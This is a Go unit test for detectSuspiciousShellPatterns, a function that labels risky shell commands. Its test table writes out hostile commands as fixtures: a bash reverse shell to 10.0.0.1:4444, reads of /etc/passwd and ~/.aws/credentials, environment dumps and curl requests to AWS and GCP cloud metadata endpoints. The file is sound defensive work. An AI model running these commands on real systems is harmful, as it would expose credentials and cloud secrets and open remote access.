package tools

import (
	"sort"
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestDetectSuspiciousShellPatterns(t *testing.T) {
	cases := []struct {
		name    string
		command string
		want    []string
	}{
		{name: "empty", command: "", want: nil},
		{name: "benign", command: "ls -la /app", want: nil},
		{name: "bare env", command: "env", want: []string{"env_dump"}},
		{name: "bare printenv", command: "printenv", want: []string{"env_dump"}},
		{name: "env piped", command: "env | grep AWS", want: []string{"env_dump"}},
		{name: "passwd cat", command: "cat /etc/passwd", want: []string{"passwd_read"}},
		{name: "aws creds", command: "cat ~/.aws/credentials", want: []string{"credential_files"}},
		{name: "aws metadata", command: "curl -s http://169.254.169.254/latest/meta-data/", want: []string{"cloud_metadata"}},
		{name: "gcp metadata", command: "curl metadata.google.internal/computeMetadata/v1/", want: []string{"cloud_metadata"}},
		{name: "reverse shell", command: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", want: []string{"reverse_shell"}},
		{name: "multiple labels", command: "env && cat /etc/passwd", want: []string{"env_dump", "passwd_read"}},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := detectSuspiciousShellPatterns(tc.command)
			sort.Strings(got)
			sort.Strings(tc.want)
			assert.Equal(t, tc.want, got)
		})
	}
}
